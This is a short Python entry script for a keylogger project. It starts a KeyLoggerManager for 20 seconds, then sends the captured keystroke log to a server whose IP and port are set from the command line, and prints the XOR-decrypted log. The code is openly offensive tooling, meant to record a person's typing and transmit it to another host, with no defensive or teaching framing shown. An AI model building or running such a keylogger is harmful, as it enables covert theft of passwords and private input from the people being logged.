from keyLoggerManager import KeyLoggerManager
import time
import sys


def main(SERVER_IP = '127.0.0.1', PORT = 5000, FILE_NAME = 'log_from_outside.txt', KEY = 5):

    KEY = int(KEY) if isinstance(KEY, str) and KEY.isdigit() else 5

    man = KeyLoggerManager(SERVER_IP, PORT, FILE_NAME, KEY)
    man.start()
    time.sleep(20)
    man.stop()
    with open(FILE_NAME, 'rb') as file:
        man.communicate(FILE_NAME)
        print(man.encryptor.xor_decrypt(file.read().decode("utf-8")))


if __name__ == '__main__':
    args = sys.argv[1:] if len(sys.argv) > 1 else []
    main(*args)

